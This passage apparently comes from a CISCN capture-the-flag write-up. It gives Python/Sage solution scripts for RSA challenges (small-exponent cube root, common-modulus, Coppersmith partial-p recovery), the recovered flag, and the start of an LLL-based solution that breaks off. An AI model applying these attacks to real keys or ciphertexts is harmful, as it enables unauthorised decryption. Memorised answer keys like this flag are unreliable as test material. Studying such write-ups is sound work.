&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;hashlib&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;md5&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;gmpy2&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;partial_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;kbits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;PR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&amp;lt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;PolynomialRing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Zmod&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;nbits&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;bin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:])&lt;/span&gt;

    &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p0&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;roots&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;small_roots&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;X&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nbits&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;kbits&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;beta&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mf&#34;&gt;0.3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;roots&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;x0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;roots&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;p&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;gcd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x0&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;p0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ZZ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;egcd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
        &lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;egcd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;g&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;y&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
 
&lt;span class=&#34;n&#34;&gt;c1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;e1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;N1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;il&#34;&gt;123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c2_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;e2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;17&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;il&#34;&gt;111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;e3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;65537&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;il&#34;&gt;111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;e3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;65537&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;il&#34;&gt;113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147L&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p03&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# ------------- Msg1 -------------&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# msg1 = long_to_bytes(gmpy2.iroot(c1, 3)[0])&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# print(msg1)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;msg1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;O wild West Wind, thou breath of Autum&amp;#39;&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# ------------- Msg2 -------------&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;egcd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;s1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;s1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s1&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;c2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inverse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;c2_&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inverse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c2_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;msg2&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c2_&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msg2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;# ------------- Msg3 -------------&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;p3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;partial_p&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p03&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;**&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;q3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;//&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p3&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;msg3&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pow&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;inverse&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;p3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q3&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)),&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;n3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msg3&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;msg&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;msg1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msg2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msg3&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;CISCN{&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;md5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;msg&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;hexdigest&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;c1&#34;&gt;# CISCN{3943e8843a19149497956901e5d98639}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;move&#34;&gt;move&lt;/h3&gt;
&lt;p&gt;LLL解出x，然后&lt;code&gt;y = e*x//n&lt;/code&gt;算出y，二分计算&lt;code&gt;s=p+q&lt;/code&gt;，计算逆元d，d*E(c)得到明文。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;c&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;row&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;matrix&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ZZ&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;^&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;e&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;n&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LLL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;row&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;512&lt;/span&gt;
